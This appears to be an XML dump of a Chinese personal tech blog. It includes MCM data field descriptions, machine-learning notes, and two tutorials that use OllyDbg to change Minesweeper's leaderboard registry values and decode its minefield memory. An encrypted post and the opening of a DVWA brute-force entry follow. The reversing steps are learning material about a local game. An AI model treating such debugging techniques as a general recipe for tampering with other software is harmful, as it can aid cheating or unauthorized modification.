<li><strong>acousticness</strong>: A confidence measure of whether the track is acoustic (without technology enhancements or electrical amplification). A value of 1.0 represents high confidence the track is acoustic. (float)</li>
<li><strong>instrumentalness</strong>: Predicts whether a track contains no vocals. “Ooh” and “aah” sounds are treated as instrumental in this context. Rap or spoken word tracks are clearly “vocal”. The closer the instrumentalness value is to 1.0, the greater likelihood the track contains no vocal content. Values above 0.5 are intended to represent instrumental tracks, but confidence is higher as the value approaches 1.0. (float)</li>
<li><strong>liveness</strong>: Detects the presence of an audience in a track. Higher liveness values represent an increased probability that the track was performed live. A value above 0.8 provides strong likelihood that the track is live. (float)</li>
<li><strong>speechiness</strong>: Detects the presence of spoken words in a track. The more exclusively speech-like the recording (e.g. talk show, audio book, poetry), the closer to 1.0 the attribute value. Values above 0.66 describe tracks that are probably made entirely of spoken words. Values between 0.33 and 0.66 describe tracks that may contain both music and speech, either in sections or layered, including such cases as rap music. Values below 0.33 most likely represent music and other non-speech-like tracks. (float)</li>
<li><strong>explicit</strong>: Detects explicit lyrics in a track (true (1) = yes it does; false (0) = no it does not OR unknown). (Boolean)`</li>
</ul>
<p><strong>Description:</strong></p>
<ul>
<li><strong>duration_ms</strong>: The duration of the track in milliseconds. (integer)</li>
<li><strong>popularity</strong>: The popularity of the track. The value will be between 0 and 100, with 100 being the most popular. The popularity is calculated by algorithm and is based, in the most part, on the total number of plays the track has had and how recent those plays are. Generally speaking, songs that are being played more frequently now will have a higher popularity than songs that were played more frequently in the past. Duplicate tracks (e.g. the same track from a single and an album) are rated independently. Artist and album popularity are derived mathematically from track popularity. (integer)</li>
<li><strong>year</strong>: The year of release of a track. (integer from 1921 to 2020)</li>
<li><strong>release_date</strong>: The calendar date of release of a track mostly in yyyy-mm-dd format, however precision of date may vary and some just given as yyyy.</li>
<li><strong>song_title (censored)</strong>: The name of the track. (string) Software was run to remove any potential explicit words in the song title.</li>
<li><strong>count</strong>: The number of songs a particular artist is represented in the full_music_data.csv file. (integer)</li>
</ul>
<h1 id="D题数据下载："><a href="#D题数据下载：" class="headerlink" title="D题数据下载："></a>D题数据下载：</h1><p><a href="2021_ICM_Problem_D_Data.zip">点击下载</a></p>]]></content>
      <categories>
        <category>竞赛</category>
      </categories>
      <tags>
        <tag>美赛</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习笔记(一)：模型评估与选择</title>
    <url>/2021/02/13/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80-%EF%BC%9A%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
<h1 id="经验误差与过拟合"><a href="#经验误差与过拟合" class="headerlink" title="经验误差与过拟合"></a>经验误差与过拟合</h1><p>&emsp;&emsp;<strong>错误率</strong>：分类错误的样本数占样本总数的比例。m个样本中有a个样本分类错误，则错误率E=a/m。<br>&emsp;&emsp;<strong>精度</strong>：分类正确的样本数占样本总数的比例。精度=1-错误率。<br>&emsp;&emsp;<strong>误差</strong>：学习器实际预测的输出与样本的真实输出之间的差异。训练集上的误差称为“训练误差”或“经验误差”，在新样本上的误差称为“泛化误差”。<br>&emsp;&emsp;<strong>过拟合</strong>：把训练样本自身的一些特点当做所有样本的一般性质，泛化性能下降。<br>&emsp;&emsp;<strong>欠拟合</strong>：对训练样本的一般性质尚未学好，学习能力过低。</p>
<p><center><img src="/2021/02/13/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80-%EF%BC%9A%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/leaf.png"></center><br>&emsp;&emsp;我们的目标是在新样本上表现好的学习器，即泛化误差小。当学习器把训练样本学的太好时，可能会出现过拟合情况。欠拟合比较容易客服，如增加训练轮数等，而过拟合是无法彻底避免的，只能缓解或者说减小其风险。<br>&emsp;&emsp;面对具体任务时，往往有多种算法可供选择，以及不同的参数配置。选择算法、配置参数的过程就叫做“模型选择”。理想的解决方案是对候选模型的泛化误差进行评估，选择泛化误差最小的模型。</p>
<h1 id="评估方法"><a href="#评估方法" class="headerlink" title="评估方法"></a>评估方法</h1><p>&emsp;&emsp;<strong>训练集</strong>：用来训练学习器的数据集。<br>&emsp;&emsp;<strong>测试集</strong>：用来测试学习器对新样本判别能力的数据集。在测试集上的“测试误差”将作为泛化误差的近似。测试集应尽可能与训练集互斥。<br>&emsp;&emsp;现有包含m个样例的数据集D={(x<sub>1</sub>,y<sub>1</sub>), (x<sub>2</sub>,y<sub>2</sub>), …, (x<sub>m</sub>,y<sub>m</sub>)}，既要训练又要测试，将D分为训练集S和测试T。</p>
<h2 id="留出法"><a href="#留出法" class="headerlink" title="留出法"></a>留出法</h2><h2 id="交叉验证法"><a href="#交叉验证法" class="headerlink" title="交叉验证法"></a>交叉验证法</h2><h2 id="自助法"><a href="#自助法" class="headerlink" title="自助法"></a>自助法</h2><h1 id="性能度量"><a href="#性能度量" class="headerlink" title="性能度量"></a>性能度量</h1><h1 id="比较检验"><a href="#比较检验" class="headerlink" title="比较检验"></a>比较检验</h1><h1 id="偏差与方差"><a href="#偏差与方差" class="headerlink" title="偏差与方差"></a>偏差与方差</h1>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>软件逆向之扫雷(一)：修改扫雷成绩</title>
    <url>/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
<h1 id="问题导入"><a href="#问题导入" class="headerlink" title="问题导入"></a>问题导入</h1><p>&emsp;&emsp;扫雷的游戏目标是在最短的时间内根据点击格子出现的数字找出所有非雷格子，同时避免踩雷，踩到一个雷即全盘皆输。如果用时破纪录，则会在扫雷英雄榜上留下昵称和用时记录。现在我们通过逆向分析来人为修改这一记录。</p>
<h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><p>&emsp;&emsp;Ollydbg：通常称作OD，是反汇编工作的常用工具。本人使用的是看雪学院的优化版OD：OllyICE，可在看雪学院官网进行下载。</p>
<h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>&emsp;&emsp;下图为游戏菜单栏，可以看出扫雷英雄榜的点击链接在“菜单栏”-“游戏”-“扫雷英雄榜”，菜单项会响应鼠标点击并显示出英雄榜信息。</p>
<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/1.png" width="200" height="265"></div>
<br>

<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/2.png" width="200" height="110"></div>

<p>&emsp;&emsp;可以看到英雄榜初始化昵称均为匿名，时间均为999。当扫雷在不同电脑运行时，该英雄榜均会初始化，因此该数据应该不是存储在exe中，可能是电脑某个文件，如软件注册表。<br>&lt;/br&gt;<br>&emsp;&emsp;用Ollydbg打开winmine.exe，得到如下调试界面：</p>
<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/3.png"></div>
&emsp;&emsp;现在我们需要找到注册表位置，也就是找到注册表相关函数，这些函数都是exe从外部dll库调入的。在反汇编窗口点击右键，选择“查找”-“当前模块中的名称（标签）”，得到exe的导入库函数。
<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/4.png"></div>
&emsp;&emsp;点击地址字段排序，最前面几个函数均是从ADVAPI32.dll导入的，和注册表有关。
<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/5.png" width="400" height="108"></div>

<p>&emsp;&emsp;RegCreateKeyExw函数功能为创建或打开注册表项。默认为创建，当注册表中有此项时，为打开。我们左键选中该函数，右键选择在“每个参考上设置断点”，这样调用该函数位置均会加上断点。</p>
<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/6.png"></div>
&emsp;&emsp;返回反汇编窗口，快捷键F9（fn+F9）运行程序到断点位置。右下角堆栈窗口即有函数调用的参数信息，可以看到注册表位置路径“Software\Microsoft\winmine”。
<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/7.png" width="400" height="101"></div>

<p>&emsp;&emsp;使用Win+R打开电脑运行，输入regedit打开注册表。</p>
<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/8.png" width="300" height="155"></div>

<p>&emsp;&emsp;在HKEY_CURRENT_USER下寻找路径software\Microsoft\winmine，找到英雄榜相关信息如下：</p>
<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/9.png"></div>
&emsp;&emsp;可以看到Name、Time字段，Name都是匿名，Time都是999，与之前看到的英雄榜数据相同，接下来修改相应字段即可。修改后打开扫雷，查看英雄榜，可见信息已经被修改。
<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/10.png" width="250" height="135"></div>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>软件逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>软件逆向之扫雷(二)：破解雷区</title>
    <url>/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
<h1 id="问题导入"><a href="#问题导入" class="headerlink" title="问题导入"></a>问题导入</h1><p>&emsp;&emsp;上一节中我们通过修改注册表修改了扫雷英雄榜，自行改动了榜上的昵称和时间。然而这只是表面工作，没有解决扫雷游戏的本质：找出所有雷区。这一节我们分析雷区的存储方式和位置，人工破解雷区。</p>
<h1 id="雷区分析"><a href="#雷区分析" class="headerlink" title="雷区分析"></a>雷区分析</h1><p>&emsp;&emsp;扫雷的界面是一个n*m的矩形雷区，每个小方块代表一个位置，和矩阵十分类似。因此我们猜想是通过二维矩阵来存储数据，将矩阵中特定位置标记为雷区，而每次点击非雷区时会出现数字，即计算点击位置周边八个块的地雷数目，然后显示在块上。<br>&emsp;&emsp;将矩阵转化成扫雷的界面则需要调用几个API函数，比较常用的就是BitBlt函数。BitBlt将某一内存块的数据传送到另一内存块，前一内存块被称为”源”，后一内存块被称为”目标”。使用该函数我们可以将矩阵进行变换，从而显示出来。</p>
<h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>&emsp;&emsp;使用OllyDBG打开扫雷程序winmine.exe，查看调用的API函数。</p>
<div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/1.png" width="400" height="325"></div>

<p>&emsp;&emsp;可以看到从GDI32.dll导入的函数很多与作图有关，如SetLayout、CreatePen等。我们选中BitBlt函数，在每个参考上设置断点，然后运行至断点处。<br>&emsp;&emsp;第一个断点处，整个扫雷界面都未加载完成，而且我们也没有进行点击，故不是所需代码块，取消该出断点，继续运行。<br>&emsp;&emsp;图像界面显示出来，程序停止了运行，表示程序还未运行到第二个断点，可能在等待用户点击鼠标。我们选择雷区任意一个位置点击，程序运行到第二个断点处停止。</p>
<div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/2.png"></div>
&emsp;&emsp;BitBlt所需参数均在图中标识出来，现在我们需要分析这些参数，找到二维矩阵的内存位置。
&emsp;&emsp;首先我们要知道矩阵位置的计算，对于一维矩阵，a[n]，a[i]的内存位置=基址(a[0])+i\*sizeof(单个数据内存大小)。对于二维矩阵a[m][n]，a[i][j]的内存位置=基址+i\*n\*sizeof(单个数据内存大小)+j\*sizeof(单个数据内存大小)。
<div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/3.png" width="300" height="110"></div>

<p>&emsp;&emsp;函数中刚好有两条类似的寻址语句。[edx+eax+01005340h]和[edx*4+105A20]。第一条是mov操作，并且更符合二维数组寻址，因此我们猜测01005340h是数组基址。</p>
<div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/4.png" width="600" height="203"></div>

<p>&emsp;&emsp;在左下角数据窗口使用ctrl+G，输入01005340h，跳转到该位置。查看数据窗口内容。</p>
<div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/5.png" width="500" height="217"></div>

<p>&emsp;&emsp;数据窗口一开始全是10，有33个。由于我们使用的是高级模式，扫雷界面是16*32，初步猜测10代表边界。然后是大量0F和少量8F。前七个数据是六个0F和一个8F，那我们点击扫雷第一排前七个格子。前七个均没有雷，第八个是雷。</p>
<div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/6.png" width="300" height="221"></div>

<p>&emsp;&emsp;查看数据区内容是否发生变化：</p>
<div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/7.png" width="500" height="111"></div>

<p>&emsp;&emsp;前五个格子为空，数据由0F变为40；第六个格子是数字1，数据由0F变为41。同时数字2、3对应数据也分别变为42、43。得出结论：未点开非雷区数据为0F，点开的非雷区数字x的数据为4x。<br>&emsp;&emsp;第七个格子是我们点中的雷，数据由8F变为CC；而第八个格子我们未点中的雷由8F变为8A。得出结论：原数据8F即表示该位置是雷。<br>&emsp;&emsp;除此之外，扫雷还有两个符号，旗子和问号，现在我们再次尝试，分别在雷区和非雷区标上旗子和问号，查看数据。</p>
<div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/8.png" width="300" height="219"></div>
<br>
<div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/9.png" width="500" height="82"></div>

<p>&emsp;&emsp;标上旗子，雷区数据由8F变成8E，非雷区数据由0F变成0E；标上问号，雷区数据由8F变成8D，非雷区数据由0F变成0D。由此可得雷区最高位为1，不论是8（1000）还是C（1010），最高位都是1；非雷区最高位为0。<br>&emsp;&emsp;由以上情况作出总结：<br>雷区（最高位为1）：<br>&emsp;&emsp;1.未点开为8F<br>&emsp;&emsp;2.点开为CC，其他为8A<br>&emsp;&emsp;3.标上旗子为8E<br>&emsp;&emsp;4.标上问号为8D<br>非雷区（最高位为0）：<br>&emsp;&emsp;1.未点开为0F<br>&emsp;&emsp;2.点开为4x（x代表格子显示数字）<br>&emsp;&emsp;3.标上旗子为0E<br>&emsp;&emsp;4.标上问号为0D<br>当然我们也可以人为修改数据达到各种效果，如初始化是雷区却不爆雷等。</p>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>软件逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>20岁</title>
    <url>/2021/05/24/20%E5%B2%81/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="136439a5efe93d6a0901be50fb24b06eeefffd6b8477995147cf6b848f271df5">5fe6c8a68ad5071aecbb46d073c33745fd8d5119223478584053223fb82f9bebc67f29404dc2d3b2769d23a02ee6c6ee3fdb7c423d3007f4f5313f836b8ac9a3996c1d1f68e82ff7c39c272d6436f348002d73302680d1e462eeacfad0b49c022adae06c86cc5e28f66961bb2cce9fb8a146496518b281bec79d977f78a3db065f5ae071989e085436f757acec368e918830c1a094dc62b660a45889c5effd25670cf1d7a3de9a6e81a337ababc277a19c24e681b2eecb29261c5045a4c8385591badc8f57d8ef3b2181ed1d6f5e345fc937e7c33ab683b1fe6f2cedf5e53a22da9073c5a82c08359bee9205d8aa73ec4c685190fa462830cfbd336de2efcf70630bf4951a27fdd4ed86a6f2e946799f00d6c0f4c82678db0bd68c36e3d5ae0c2958cf3b9e6b3019c916f176fb1f3be547fb773ab760d1e5a314aaa3357bca39f4ba2d3173768fae547c9af53d57eee74cda7581fce214508904b911bf38a89dd42a36ba5fe6e0ea184e168b6952f39c920c0eb0ce114fddb3b2f919330cb4c9510d1990f1f52bf6f41f506437e419b9f21f65411c0eae7e2ee3dc5c10cc32818f66dfefa70570a1ed815dc2e4068c59fda332f06ccd3a367b72b298b6d2c72e8b4fa224e26b8998da33578c18aa2e2de0bea7c5b8afb6b7405a0593dcc646643f4684f9d2094531777da1a3e6e94fa8a5f5882b2e2e2f510d73ef571822a4c02fd08a967039923628c2463c8976746de0634b387ecfea788b3ea9d5e2d2a8aa7bf07bf8ffec90ec8523a0908d52dba7736b1148c43809f0e09c7a8a7dfabb6d6593c75fd5d70642f50f04d7e99c8b44f775f4bf35b3ab15fbaaed34a96b5e7b043247685cd67a6502b7a86a4f273ae8e90146d954250a8d23aa83918bad6ca27822c58bc994aab2371847b3670b492c40d89efc3f63385debb6d94accad1cc29119d6e7cba4f18eda3463641925827156ec734e6d1753dc0561f381652293a09a9f2129e69a46d9b7c669788cd3b2b3748d96985ce03fc0b8ead638ef741f691da419920d86cee360847936998ed1184e6d384b7aebec347b1bf7081fd9b4c16a4f2ad60ee9521f1c947071a91c73b808bdc9141bff610b68a123f4a0991e33adc022bda8bf9d0d46109c582ebcae64882d80dcef06d94d4990b2199a5526562b8ba3c6bb6675490bb84bff7b86f4d831eb80963dea3d1bb98e679a8352d110010cac0a02f1c82a649318e05dee5d57a3f4c942b96a76de398f447831611a6254f69a6ba7400b64a6e5f8fde0b5ec811cf05457fc90f50496183261dc72ba3c51fa3c03887f1adcb10b245ce19fcba9f2766a818bfa52f5527d75c210281fb88bc1abcf576192aea7ae89a5cc3bced7bdfa8f5003d18fd60f31f86aa6f7365532fe0bad4564f8cb5d852d6d5d310c2d0abb43623a1ee8597def1dd16dae056662c6c2fd08b0bde65d32be5141b826a35ceb03d72e912435abdc12c6e31220753a088761f85fa56da3a56b3ec912c3b52ed8c61edffd717b9add7e7dc9794ef3e144912dbda42fb2544990effa650599e2c4bc615e679af4c8df99065e377f82a30f08c40acbde77a4313f87eb084cc76260251578e3ab8c50c366083a4ae067d257f68e663d5bbd42c35bf2e2f0b8aa9ad016c9c92a4b14b6430fbdbf56e50a11e52945bab19cc13dabff77becdbc02a4c747b485951a71d2bcee4fbab1a901c1a86aa3d9fe995d76a48247afeec53c2c2bf27290f0f5292e047231f7498e9bd617f5f8a81402c7011dc0cae1700e5ce864b1c49de2a4af6ef89078321c052f9beb891f28223b9048df9c6cbe0923ca1f13f93df60a6d64cc233b2d51793f145e087e46f8c0ab09ab5e67e059f7917609b8c9881674c72f5bb50b1bba9e1a2df879101dbb7d44af5e56db416fb5b82c7c4768022ca4ba11682acb2ead5dc2eb4fc99c52641b35882020099a7369ce2ea0598f568d5c384be103f66c8f74a142cf09b9ee104567df3c18142b9327314ea8e3456a7728bf3ee7941cb0e318326fca68519440a7b02b867606acc6c4812c8faaf38d24bb254c46eb543fc6a69c5cfbc8f5e45a04bbfd942cedb24784372341a757d098249f7622d5bdebd2d03f52eb84078b6862f12dee30ba15b0410dcb854c395ac3dcc5657c2c0c9c6dabee135af8bdb967d903eaeb13a678b1259b2c6f75a3173eb0f7539b81331252b205d6faec5694d25a9f03a832fd19b8d4488ae106f1a6f2a1e95148fc7f0adb4165665cbb525d68c0357aaa9676294912811b3f93ab3b6cd7a9d25ca88520e5578b8fb9b8c1ca969b9d666306a498e20214a202a7c76d9c9b7f97521242f1e6c562b8297779755c476f14a9867df78419ab122b1d9476818efbb3526621cd6624c0fd84cd70fceefc541664cf02280a1210fde6d60fc9dc2df3762cab343e1e471bd26734bfa9521dd59ed94c31e90d0ec37f2cd659c48fd83825b1635da909bd27b82014bbcb4b7aca0ed9ba2c51b5650609427e052e768e3692f1964360e2aff0731489debfb82425a45e1e3fce803117ee9aaa4169f883dceca4259cf7f1bbbf4335a60cce5c72b567e70dc1e1d584ff3638cbfd9a93d6874061514a0268a0bb7f51220de4f2a585dd46b71242df7ced07775b3fdf46a8143f0d5a875108476919de0a51eea921a36924577ffe26b2cb85756b0de28d4dfda6169569d7859448e1fb3525907a1efac064c97bbf155b7a810c3d6025fcb75544ec73b2f83e6fba5d85c2775f193b1e80fa31674cbad3d62b17094aa32447d445bddab7e9b776c89c7835d74971ca57ec730b14e71f4d7f0dc105a78102ac64a1af02354fa638b164922f92bee6928c353089d47b1f88a45d408a3d7291777710218b5e2712f504388d1e42e2602cdc25550c19147a0218d318ae97fe575ef85b1d07c272d492fb16fc9b79423efcdb2990e6e1c5f9772a06918c95145d428213b7c6ad81238eb53bf9fcce727beb26aab88cac1a6f0a4e3a976979c308ebbc951b6f18a62718085e59b9c899f64f0d6e227b3a55f83cf3799c709db2e4a5bbd4eb1811c81fd6822eeb91172aac8fda178b9404f44ee781956dec00d28a9158d9bc1f0e8a9a78f38321735452902dd7ce52333b930b7a8f9b3394bffb008689e2903e3f64d73df301e41008418f811af72025abeb9bcc9c0a09078ae8236998d9aec9c6ffb604044e06ee47e1309ca6be9de24eaee773337a79193a6ac074de5fed471740aa3db04585a488db153d5aad0bc05b860399cd86c1a5511896afb32fad5ba958ac2efd9fd6cb9f6020abde702e18991d1cd5a5574a9149d41f3fce5018a355b119ce4bed5cd9f7fda0f95bb11d566788e1c19cb8a9aed4a655dde6232f614511e79135755e6cff73d09b6cc3bcc60712be260bd473392458a59e49d2d3e50e0f47213361d265a99cb5731b2eacac7c56017db44f434b4dc9a64770342fe214b00d91ddc50e99d22d771901c3f05bde61aa3a670647b7b07c3dd6641809afedd7b38200547b654ba93f575f1186df0644d47da509db3510ec53d9735f6352e67f916e01e202943e5a9a9bd3ddc6b62b78b0b4d11c5c15da7bde391c033b98d047b2a16ad5cc80fef6e406ec9b840f4eca60be20c6c05e6fbced30eece42aebe5fa5538f8e01357f0413c27ececdcec36be7f658ac3e185f1113294afabbcafff2fe1cfdd282a9695c584afdbded829133dd309b9c0292052121222f287bcb9a1b59b58dde5682131749a737055f4a19e59947906cec534abed56c3039509c08a9b8a9e208272e3f40362d4ba915b83bd8dba0ba01d15586eb88d080cfff8cb3d4d914485e2ffa2def89c81a866c4d7d5d0200517e59c51c632b6b5d7f9a6e92e7d674aacde21034caca6207ec13800a7e09b5e7b490c4676646be33c0d8a1f8679007c8af4b1b68986c51d0794e07ed33655b1923740e5f96028b8328bf37d77d2c6459b262d881764f71e65cfda7270d29f1d92fceba1da5bb846b08da29d16869d4f37376dab1a7232abc4160a832402fe67a8c489275aafa2cc84edcf85765a7b9b5cb364d48858f4789e61dcb97942fb4b0a41db154e7a9c85e73d822f0b0f0693df57a7d154d3012a6f12cb8f9a4c1b1bfe248a5d3fd372b2571857fe96c41b379d1622b9f3a2514218c5e543f4bbe6a4cd748c256d39ee72ad314d6c772d4003809419eb880315a4e544c1faed96caf71d4f8a274c2b52edeedcac6825810e04fa947ec8249093b031137326e9fadff2c5afc267f32fc5791a8ae3b205b5988b8f3ac9b9cb968efae3eea517ddb80453f0bf3e35e547181867bf9553813aacbb2a11ea8a716abd64ed8f4de69c32c528b290faedad553a92da17b60d33d6abfb594b1ae421365bd68455898b12e6744246897b8fec8b7cead708a4e429b2dd5a226667d29860b3ef83c4b7cc497f92e4f07837e59dac41fd5b8fb98dc082b628e572cc4a5f8faa32a06a78b4dbaa95d32f6e34f67751e41cdbc05b57ed21b73447c7210506925c218c777d47e89058aea67c757f5f574927a8e874b76f3e75571cf1f8f413b10c814e49f35f4269412d3cdb4567a4682a2d3b16d2379e49da15b13780578e1490e0ac95184f049d79502804ab0d5b8eb96cb14553e385afc8c2bcdc8e1c29fe160498497c837d913da9f9629cfe2bb866d21e88eab2ab15bdf918893a0cd6d45534ae75156d79b651c91b5ea377e4a656510cc01eb409e68f57978a51b10f56cf46d354b2bba7fe070f31ac9728120bd6ca21450181d120e117b0dbdefaccb73ee4f2b6209e82f4933e33409371db97d409345b35cab5a8b7ec47b3ae38db6ff896cabd526d8e1f528537254fd7a6c3a288b4dd44b2ed1d24b038c394ed11c6e58bb0ac99ff472cd582125ddda812d4a8affa6953aadcf06800f1cc2642c75e2779c11e4b81c1e261bf98ff57499d02a64a03b756df3dac498d5fe87176a0e0d15964ed7555e5d23cec9ddaba9e99cb9d5bc4bc872dbc90c30475122018cdb0b70d358773e579e7a7cb0c3b1ba3162f83cae8fcefd1c96cd1f9ffcb4a3ad31caa8a574e495bbb02b0ed7a66abd52d3ce8a7f78ba5fb56d0854903a393860268e763bc22a9f3225d655e7445b94735ba2046bafc98f26d4d703edef571e907305c4b26c03073d308964b31519cd5aa7e6edf6d90735685888a667157d1b2c8b8f45a4ea0a125acf28e44db645ee22b8980e655571398bfd307f2e074160011ea4eae49cabf15dd8be2bf0441a87da33aeb968029e0e54300adb4017a7c8ef51a6d9b1b726e9df6ba21a6209c7b637a91a974c15f382e86164a2cfebfc22208295b6ace727f38e827a09f3a5c80da2f328b31863cf5e1c25c4f291ec9bb09cd520da0cf4e2eac0b807d6b7bc</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码为我的出生年份</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>人生十年</category>
      </categories>
      <tags>
        <tag>生日</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA(一)：Brute Force（暴力破解）</title>
    <url>/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/</url>
    <content><![CDATA[<!-- excerpt --><br><!-- toc --></p>
